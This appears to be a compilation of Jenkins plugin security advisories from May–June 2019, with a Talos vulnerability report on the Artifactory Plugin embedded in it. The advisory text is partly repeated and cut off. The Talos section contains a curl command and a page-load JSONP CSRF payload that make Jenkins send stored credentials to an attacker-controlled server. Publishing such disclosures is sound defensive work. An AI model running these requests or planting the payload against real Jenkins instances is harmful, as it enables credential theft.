Summaries of the vulnerabilities are below. More details, severity, and
attribution can be found here:
<https://jenkins.io/security/advisory/2019-05-31/>

We provide advance notification for security updates on this mailing list:
<https://groups.google.com/d/forum/jenkinsci-advisories>

If you discover security vulnerabilities in Jenkins, please report them as
described here:
<https://jenkins.io/security/#reporting-vulnerabilities>

---

SECURITY-1373 / CVE-2019-10325
Warnings Next Generation Plugin rendered the name of a custom warnings
parser unescaped on Jenkins web pages. This allowed attackers with
Job/Configure permission to define a custom parser whose name included
HTML and JavaScript, resulting in a persisted cross-site scripting
vulnerability.

Warnings Next Generation Plugin now properly escapes custom warnings
parser names.

SECURITY-1391 / CVE-2019-10326
Warnings Next Generation Plugin did not require that requests sent to the
endpoint used to reset warning counts use POST. This resulted in a cross-
site request forgery vulnerability that allows attackers to reset warning
counts for future builds.

Warnings Next Generation Plugin now requires that these requests be sent
via POST.

SECURITY-1409 / CVE-2019-10327
Pipeline Maven Integration Plugin did not configure its XML parser in a
way that would prevent XML External Entity (XXE) processing.

This allowed attackers able to control the contents of a temporary
directory on the agent that the Maven build is executing on to have
Jenkins parse a maliciously crafted XML file that uses external entities
for extraction of secrets from the Jenkins master, server-side request
forgery, or denial-of-service attacks.

Pipeline Maven Integration Plugin no longer processes XML External
Entities in XML documents.

SECURITY-921 / CVE-2019-10328
Pipeline Remote Loader Plugin provides a custom Script Security whitelist.
Those entries apply to all scripts with sandbox protection, such as
Pipeline.

One entry provided here was unsafe, as it allowed invoking arbitrary
methods, bypassing sandbox protection.

The unsafe whitelist entry has been removed.

SECURITY-1403 / CVE-2019-10329
InfluxDB Plugin stored target passwords unencrypted in its global
configuration file on the Jenkins master. These credentials could be
viewed by users with access to the master file system.

InfluxDB Plugin now stores its passwords encrypted.

SECURITY-1046 / CVE-2019-10330
Multibranch pipelines are typically configured so that only committers to
the repository are able to effectively propose changes to Jenkinsfiles.
Changes to Jenkinsfiles in pull requests created by other users would not
be trusted, and the target branch’s Jenkinsfile content is used instead.

Gitea Plugin did not implement this behavior. Attackers without commit
access to the Git repository could therefore propose changes to
Jenkinsfiles and have those be applied for PR builds despite the
configuration declaring them to be untrusted.

Gitea Plugin now implements the desired behavior of only trusting pull
request content when those are trusted.

SECURITY-1015 (1) / CVE-2019-10321 (CSRF), CVE-2019-10322 (permission check)
Artifactory Plugin does not perform permission checks on a method
implementing form validation. This allows users with Overall/Read access
to Jenkins to connect to an attacker-specified URL using attacker-
specified credentials IDs obtained through another method, capturing
credentials stored in Jenkins.

Additionally, this form validation method does not require POST requests,
resulting in a cross-site request forgery vulnerability.

As of publication of this advisory, no release containing a fix is
available.

SECURITY-1015 (2) / CVE-2019-10323
Artifactory Plugin provides a list of applicable credential IDs to allow
users configuring the plugin to select the one to use.

This functionality does not correctly check permissions, allowing any user
with Overall/Read permission to get a list of valid credentials IDs. Those
can be used as part of an attack to capture the credentials using another
vulnerability.

As of publication of this advisory, no release containing a fix is
available.

SECURITY-1347 / CVE-2019-10324
Artifactory Plugin implements a number of API endpoints allowing users to
trigger various actions related to releasing and promotion.

These endpoints do not require POST requests, resulting in a cross-site
request forgery vulnerability.

As of publication of this advisory, no release containing a fix is
available.

# Talos Vulnerability Report

### TALOS-2019-0787

## Jenkins Artifactory Plugin information disclosure vulnerability

##### June 4, 2019

##### CVE Number

CVE-2019-10321 - CVE-2019-10322

### Summary

An exploitable information disclosure vulnerability exists in the `testConnection` endpoint of the Jenkins Artifactory Plugin 3.2.0 and 3.2.1. As a result of this vulnerability a crafted HTTP request from a user with Overall/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credentials from the Jenkins credentials database to an attacker controlled server.

In addition to the above, due to the lack of CSRF (Cross Site Request Forgery) token validation on these endpoints, this vulnerability may be exploited via CSRF.

### Tested Versions

Jenkins Artifactory Plugin 3.2.1
Jenkins Artifactory Plugin 3.2.0

### Product URLs

[https://www.jfrog.com/confluence/display/RTF/Jenkins+Artifactory+Plug-in](https://www.jfrog.com/confluence/display/RTF/Jenkins%2BArtifactory%2BPlug-in)
<https://github.com/jenkinsci/artifactory-plugin>

### CVSSv3 Score

6.8 - CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N

### CWE

CWE-285: Improper Authorization

### Details

The Jenkins Artifactory Plugin brings Artifactory’s Build Integration support to Jenkins.

#### CVE-2019-10322 - `doTestConnection` missing permission check

This vulnerability exists in the `testConnection` endpoint exposed by the `doTestConnection` method of `org.jfrog.hudson.ArtifactoryBuilder` due to missing Jenkins permissions check. To exploit this vulnerability an attacker must know the credential identifier of the credential to leak. This said, this information can be obtained via a number of means, such as additional information disclosure vulnerabilities in this, and other, Jenkins plugins (see TALOS-2019-0846).

Due to the way in which this plugin expects to authenticate against the remote Artifactory instance, the credentials associated with the attacker specified `credentialsId` are base64-encoded and submitted as part of the HTTP `Authorization` header to the attacker-controlled server. An example of this attack against a Jenkins 2.165 instance running a vulnerable version of this plugin and configured to allow anonymous read access has been provided below.

```
# Send credentials to an attacker's server (http://192.0.2.1:7000?).
# The trailing '?' is to ensure that the expected path is appended as a
# query parameter, rather than part of the query path.
$ curl -s -X GET -G \
    -d 'artifactoryUrl=http://192.0.2.1:7000/?' \
    -d 'connectionRetry=0' \
    -d 'useCredentialsPlugin=true' \
    -d 'credentialsId=287fcbe2-177e-4108-ac58-efdc0a507376' \
    'http://jenkins.docker.local:8080/descriptorByName/org.jfrog.hudson.ArtifactoryBuilder/testConnection'

```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following:

```
# First request from Jenkins (GET)
/?/api/system/version
Host: 192.0.2.1:7000
Connection: Keep-Alive
User-Agent: ArtifactoryBuildClient/2.13.3
Accept-Encoding: gzip,deflate
Authorization: Basic U2VjdXJlVXNlcm5hbWU6U2VjdXJlUGFzc3dvcmRPaE5v

```

It is worth noting that as the response from the attacker-controlled server is not in the expected format, the plugin will raise an error but not render the response.

#### CVE-2019-10321 - `doTestConnection` CSRF

This vulnerability exists in the `testConnection` endpoint exposed by the `doTestConnection` method of `org.jfrog.hudson.ArtifactoryBuilder` due to missing CSRF validation.

The payload below could be embedded in a webpage and will successfully execute a request against the target Jenkins instance on page load. Due to lack of CSRF validation in the plugin, and lack of additional mitigations such as `SameSite` Cookie attribute, this JSONP (JSON with padding) request will utilize any currently authenticated Jenkins sessions for the configured target. This payload has been confirmed working in Safari 12.1.1 (14607.2.6.1.1) and Google Chrome 74.0.3729.169.

It’s worth noting that despite the use of JSONP, the response content is not accessible due to a MIME type mismatch (`application/json` versus `application/javascript`) and explicit `X-Content-Type: nosniff` header being returned by Jenkins. This said, the request will still execute as expected, performing an onward request to the attacker’s server (specified by the `artifactoryUrl` parameter) containing the credentials associated with the specified `credentialsId`.

```
<!-- Perform request in the background. This proof-of-concept requires jQuery. -->
<script>
  $(document).ready(function() {
    target = 'http://jenkins.docker.local:8080'
    $.ajax({
        url: target + "/descriptorByName/org.jfrog.hudson.ArtifactoryBuilder/testConnection",
        jsonp: "jsonp",
        dataType: "jsonp",
        data: {
            artifactoryUrl: "http://192.0.2.1:7000/?",
            connectionRetry: "0",
            useCredentialsPlugin: "true",
            credentialsId: "287fcbe2-177e-4108-ac58-efdc0a507376",
            pretty: true,
        },
        success: function(data) {}
    });
  });
</script>

```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following:

```
# First request from Jenkins (GET)
/?/api/system/version
Host: 192.0.2.1:7000
Connection: Keep-Alive
User-Agent: ArtifactoryBuildClient/2.13.3
Accept-Encoding: gzip,deflate
Authorization: Basic U2VjdXJlVXNlcm5hbWU6U2VjdXJlUGFzc3dvcmRPaE5v

```
### Mitigation

Until such time that the vendor produces a patched version, this plugin should be disabled (if possible), or unnecessary users with Overall/Read permissions removed (such as anonymous access).

[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)

**Affected plugin:
[`warnings-ng`](https://plugins.jenkins.io/warnings-ng)**

**Description:**

Warnings Plugin rendered the name of a custom warnings parser unescaped on Jenkins web pages.
This allowed attackers with Job/Configure permission to define a custom parser whose name included HTML and JavaScript, resulting in a persisted cross-site scripting vulnerability.

Warnings Plugin now properly escapes custom warnings parser names.

### CSRF vulnerability in Warnings Plugin

**SECURITY-1391
/
CVE-2019-10326**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)

**Affected plugin:
[`warnings-ng`](https://plugins.jenkins.io/warnings-ng)**

**Description:**

Warnings Plugin did not require that requests sent to the endpoint used to reset warning counts use POST.
This resulted in a cross-site request forgery vulnerability that allows attackers to reset warning counts for future builds.

Warnings Plugin now requires that these requests be sent via POST.

### XML External Entity processing vulnerability in Pipeline Maven Integration Plugin

**SECURITY-1409
/
CVE-2019-10327**

**Severity (CVSS):**
[High](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:L)

**Affected plugin:
[`pipeline-maven`](https://plugins.jenkins.io/pipeline-maven)**

**Description:**

Pipeline Maven Integration Plugin did not configure its XML parser in a way that would prevent XML External Entity (XXE) processing.

This allowed attackers able to control the contents of a temporary directory on the agent that the Maven build is executing on to have Jenkins parse a maliciously crafted XML file that uses external entities for extraction of secrets from the Jenkins controller, server-side request forgery, or denial-of-service attacks.

Pipeline Maven Integration Plugin no longer processes XML External Entities in XML documents.

### Unsafe entry in Script Security list of approved signatures in Pipeline Remote Loader Plugin

**SECURITY-921
/
CVE-2019-10328**

**Severity (CVSS):**
[High](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Affected plugin:
[`workflow-remote-loader`](https://plugins.jenkins.io/workflow-remote-loader)**

**Description:**

Pipeline Remote Loader Plugin provides a custom list of pre-approved signatures for Script Security.
Those entries apply to all scripts with sandbox protection, such as Pipeline.

One entry provided here was unsafe, as it allowed invoking arbitrary methods, bypassing sandbox protection.

The unsafe pre-approved entry has been removed.

### InfluxDB Plugin stored credentials in plain text

**SECURITY-1403
/
CVE-2019-10329**

**Severity (CVSS):**
[Low](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)

**Affected plugin:
[`influxdb`](https://plugins.jenkins.io/influxdb)**

**Description:**

InfluxDB Plugin stored target passwords unencrypted in its global configuration file on the Jenkins controller.
These credentials could be viewed by users with access to the Jenkins controller file system.

InfluxDB Plugin now stores its passwords encrypted.

### Improper handling of untrusted branches in Gitea Plugin

**SECURITY-1046
/
CVE-2019-10330**

**Severity (CVSS):**
[Medium](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L)

**Affected plugin:
[`gitea`](https://plugins.jenkins.io/gitea)**

**Description:**

Multibranch pipelines are typically configured so that only committers to the repository are able to effectively propose changes to Jenkinsfiles.
Changes to Jenkinsfiles in pull requests created by other users would not be trusted, and the target branch’s Jenkinsfile content is used instead.

Gitea Plugin did not implement this behavior.
Attackers without commit access to the Git repository could therefore propose changes to Jenkinsfiles and have those be applied for PR builds despite the configuration declaring them to be untrusted.

Gitea Plugin now implements the desired behavior of only trusting pull request content when those are trusted.

### CSRF vulnerability and missing permission check in Artifactory Plugin allow capturing credentials

**SECURITY-1015 (1)
/
CVE-2019-10321 (CSRF), CVE-2019-10322 (missing permission check)**
